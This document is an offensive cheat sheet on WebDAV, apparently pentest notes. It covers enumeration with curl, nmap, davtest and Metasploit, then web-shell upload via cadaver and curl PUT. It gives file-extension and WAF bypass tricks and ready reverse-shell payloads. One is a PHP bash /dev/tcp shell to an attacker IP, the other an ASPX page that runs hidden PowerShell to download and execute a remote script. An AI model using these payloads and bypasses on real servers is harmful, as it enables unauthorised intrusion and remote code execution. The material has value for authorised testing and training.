# WebDAV – Web Distributed Authoring and Versioning

**WebDAV** is an HTTP extension that allows users to **remotely manage files** on web servers. It enables **read/write** operations via standard HTTP methods like `PUT`, `DELETE`, `PROPFIND`, and `MKCOL`.

WebDAV is often found **enabled by default** on:

- **IIS** (with WebDAV Publishing Feature)
    
- **Apache** (with `mod_dav`)
    
- **Nginx** (when explicitly configured)
    

If misconfigured, WebDAV allows:

- **Uploading arbitrary files** (e.g., web shells)
    
- **Script execution** (if file handlers like `.php`, `.asp`, etc. are supported)
    
- **Privilege escalation** or **initial foothold** via client-side interaction (e.g., mapped WebDAV shares)
    

---
## How to Identify WebDAV on a Target

### Identify WebDAV Support via HTTP Methods

Use `OPTIONS` to identify allowed methods:

```bash
curl -X OPTIONS http://$IP -i
```

Look for:

```
Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, COPY, MOVE, MKCOL
DAV: 1,2
```

### Nmap Detection

```bash
nmap -p 80,443 --script http-methods,http-webdav-scan $IP
```

or, more simply:
```bash
sudo nmap -p 80 -sC $IP
```

Key Nmap scripts:

- `http-methods`: Lists supported HTTP verbs.
    
- `http-webdav-scan`: Checks for WebDAV functionality and upload support.
    

---
## WebDAV Methods That Indicate Danger

| Method     | Description                  | Risk                         |
| ---------- | ---------------------------- | ---------------------------- |
| `PUT`      | Uploads files to server      | Allows arbitrary file upload |
| `DELETE`   | Removes files                | Can delete site content      |
| `MKCOL`    | Creates new directory        | Enables structured uploads   |
| `PROPFIND` | Queries metadata (like `ls`) | Used for enumeration         |
| `MOVE`     | Moves files                  | Can bypass security controls |
| `COPY`     | Copies files                 | Allows backup duplication    |

---
## Enumeration Techniques

### Using `curl`

```bash
curl -X OPTIONS http://$IP
```

Check for `DAV:` header and dangerous HTTP methods.

### Using `davtest`

```bash
davtest -url http://$IP
```

- Tests if PUT works.
    
- Tries to upload test payloads like `.php`, `.asp`, `.jsp`, `.pl`.
    
### Using Metasploit

```bash
use auxiliary/scanner/http/webdav_scanner
set RHOSTS $IP
run
```

---

## Exploitation Techniques

### Using `cadaver` to Upload Payload

```bash
cadaver http://$IP
put shell.php
```

### Upload with Extension Bypass

```bash
curl -X PUT --data-binary @shell.php http://$IPshell.php;.jpg
```

Try:

- `shell.pHp`
    
- `shell.php;.jpg`
    
- `shell.ph%00p`
    

---
## Tools for WebDAV Testing

### `cadaver`

- Interactive WebDAV client.
    
- Use for listing, uploading, downloading, or deleting files.
    

```bash
cadaver http://$IP
```

### `davtest`

- Automated scanner and uploader.
    
- Uploads various file types and checks for execution.
    

```bash
davtest -url http://$IP
```

### `curl`

- For HTTP method testing and uploading payloads.
    

```bash
curl -T <file> http://$IP
```

### `Metasploit`

```bash
use auxiliary/scanner/http/webdav_scanner
```

---
## Post-Exploitation: Getting a Shell

### PHP Reverse Shell Example

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
```

or, grab from Kali:
```
cp /usr/share/webshells/php/php-reverse-shell.php .
```

### ASPX Reverse Shell Example (for IIS targets)

```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/shell.ps1')\""); %>
```

or, grab from Kali:
```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

---
## Bypasses and Defense Evasion

- **.htaccess Bypass**:
    
    - Modify file handling to allow `.php.txt` execution.
        
- **Extension Obfuscation**:
    
    - `shell.pHp`, `shell.php;.txt`, `shell.php%00.jpg`
        
- **HTTP Verb Tunneling**:
    
    - Some WAFs block `PUT`, but not `POST` + `X-HTTP-Method-Override`.
        

```bash
curl -X POST -H "X-HTTP-Method-Override: PUT" --data-binary @shell.php http://$IP
```

- **Double-Encoding**:
    
    - Use `%252e` instead of `.` in file names.
        

---

## WebDAV + IIS (Windows Targets)

- WebDAV often installed with **IIS 6.0/7.5/10**.
    
- Upload `.aspx`, `.asp`, or `.config` files for RCE.
    
- File upload path often accessible at:
    
    ```
    http://$IP/uploads/shell.aspx
    ```
    

Check if WebDAV is enabled:

```bash
curl -I http://$IP/uploads/
```